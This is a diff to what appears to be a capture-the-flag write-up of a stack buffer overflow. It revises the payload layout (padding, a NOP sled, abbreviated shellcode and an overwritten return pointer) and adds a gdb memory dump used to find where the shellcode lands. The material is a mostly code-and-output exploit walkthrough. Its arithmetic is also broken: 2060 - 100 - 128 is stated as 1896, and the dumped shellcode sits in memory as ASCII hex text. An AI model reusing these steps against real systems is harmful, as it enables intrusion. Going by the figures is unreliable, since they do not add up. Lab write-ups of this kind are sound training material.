@@ -139,17 +139,35 @@ Now that it works, update "shellcodePwn.py" to read "/root/flag.txt":
 Now that we've got a shellcode, lets craft a payload. Our requirements are:
 
 - 2060 bytes + pointer to shellcode.
-- 64 bytes for shellcode.
+- 64 bytes (128 chars) for shellcode.
 - Lets add 100 bytes of no operation instruction (NOPS)
 
-         Buffer = "\x41" * (2060 - 100 - 64) = 1896
+         Buffer = "\x41" * (2060 - 100 - 128) = 1896
            NOPs = "\x90" * 100
-      Shellcode = "\x44" * 150
-            EIP = "\x66" * 4
+      Shellcode = "48b8...0f05"
+            EIP = "\x5a" * 4
 
 
+After using the payload, lets find where the shellcode is in memory:
 
+(gdb) x/30xg $esp+2332
+0xffffd68c:	0x4141414141414141	0x4141414141414141
+0xffffd69c:	0x4141414141414141	0x4141414141414141
+0xffffd6ac:	0x4141414141414141	0x9090414141414141
+0xffffd6bc:	0x9090909090909090	0x9090909090909090
+0xffffd6cc:	0x9090909090909090	0x9090909090909090
+0xffffd6dc:	0x9090909090909090	0x9090909090909090
+0xffffd6ec:	0x9090909090909090	0x9090909090909090
+0xffffd6fc:	0x9090909090909090	0x9090909090909090
+0xffffd70c:	0x9090909090909090	0x9090909090909090
+0xffffd71c:	0x3130386238349090	0x3130313031303130
+0xffffd72c:	0x3035313031303130	0x3636303638623834
+0xffffd73c:	0x3537393735376632	0x3133383431303130
+0xffffd74c:	0x3862383434323430	0x6636663632376632
+0xffffd75c:	0x6336363666323437	0x3835323061363035
+0xffffd76c:	0x3133376539383834	0x3134353066303666
 
+0xffffd71c
 
 
 
